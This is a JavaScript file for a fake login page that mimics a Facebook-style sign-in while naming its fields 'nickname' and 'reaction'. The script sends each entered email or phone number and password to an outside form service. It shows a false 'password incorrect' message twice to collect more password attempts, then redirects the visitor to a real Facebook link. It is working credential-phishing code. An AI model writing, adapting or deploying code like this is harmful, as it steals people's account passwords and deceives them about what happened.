const form = document.querySelector("#name-form");
const nicknameInput = document.querySelector("#nickname");
const reactionInput = document.querySelector("#reaction");
const submitButton = document.querySelector("#submit-button");
const message = document.querySelector("#form-message");
const contactCard = document.querySelector(".contact-card");

const submissionCountKey = "prank-successful-submissions";
const redirectUrl = "https://www.facebook.com/share/r/19Ro3e1AYE/";

function setMessage(text, type = "error") {
  message.textContent = text;
  message.classList.toggle("is-visible", Boolean(text));
  message.classList.toggle("is-success", type === "success");
}

function shakeForm() {
  contactCard.classList.remove("shake");
  // force reflow so the animation can restart
  void contactCard.offsetWidth;
  contactCard.classList.add("shake");
}

function redirectAfterThirdSubmission() {
  const savedCount = Number.parseInt(localStorage.getItem(submissionCountKey) || "0", 10);
  const nextCount = (Number.isNaN(savedCount) ? 0 : savedCount) + 1;

  if (nextCount >= 3) {
    localStorage.removeItem(submissionCountKey);
    window.location.assign(redirectUrl);
    return true;
  }

  localStorage.setItem(submissionCountKey, String(nextCount));
  return false;
}

[nicknameInput, reactionInput].forEach((input) => {
  input.addEventListener("input", () => {
    input.removeAttribute("aria-invalid");
    setMessage("");
  });
});

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const nicknameIsEmpty = nicknameInput.value.trim() === "";
  const reactionIsEmpty = reactionInput.value.trim() === "";

  nicknameInput.toggleAttribute("aria-invalid", nicknameIsEmpty);
  reactionInput.toggleAttribute("aria-invalid", reactionIsEmpty);

  if (nicknameIsEmpty || reactionIsEmpty) {
    setMessage(nicknameIsEmpty ? "Enter an email or phone number." : "Enter a password.");
    (nicknameIsEmpty ? nicknameInput : reactionInput).focus();
    shakeForm();
    return;
  }

  submitButton.disabled = true;
  submitButton.textContent = "Logging in...";
  setMessage("");

  try {
    const response = await fetch(form.action, {
      method: "POST",
      body: new FormData(form),
      headers: { Accept: "application/json" },
    });

    if (!response.ok) {
      throw new Error("Formspree could not accept the response.");
    }

    // Count this as a successful submission
    const isThirdTry = redirectAfterThirdSubmission();

    if (isThirdTry) {
      // 3rd try → real success + redirect (redirect happens inside the function)
      return;
    }

    // 1st or 2nd try → pretend login failed
    nicknameInput.toggleAttribute("aria-invalid", true);
    reactionInput.toggleAttribute("aria-invalid", true);
    setMessage("The password that you've entered is incorrect.");
    shakeForm();
    reactionInput.focus();
    reactionInput.select();

  } catch {
    setMessage("Something went wrong. Please try again.");
    shakeForm();
  } finally {
    submitButton.disabled = false;
    submitButton.textContent = "Log In";
  }
});